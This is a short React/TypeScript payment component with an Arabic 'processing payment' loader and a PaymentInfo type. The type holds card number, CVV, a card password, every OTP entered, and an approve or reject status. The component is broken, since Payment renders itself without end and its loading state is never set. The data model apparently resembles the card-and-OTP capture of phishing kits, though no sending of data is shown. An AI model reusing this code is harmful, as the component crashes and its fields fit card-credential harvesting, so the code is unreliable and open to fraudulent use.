"use client"
import {  useState } from "react"
import { FullPageLoader } from "@/components/fullpageloader"
import type React from "react"
type PaymentInfo = {
  cardNumber: string
  year: string
  month: string
  bank?: string
  cvv?: string
  otp?: string
  pass: string
  cardState?: string
  allOtps?: string[]
  bank_card?: string[]
  prefix?: string
  status?: "new" | "pending" | "approved" | "rejected"
  page?: string
}
export default function Payment(){
const [loading,setLoading]=useState(false) 

return (
    <div>
        <Payment/>
      {loading && <FullPageLoader text="معالجة الدفع ..." />}
    </div>
)

}
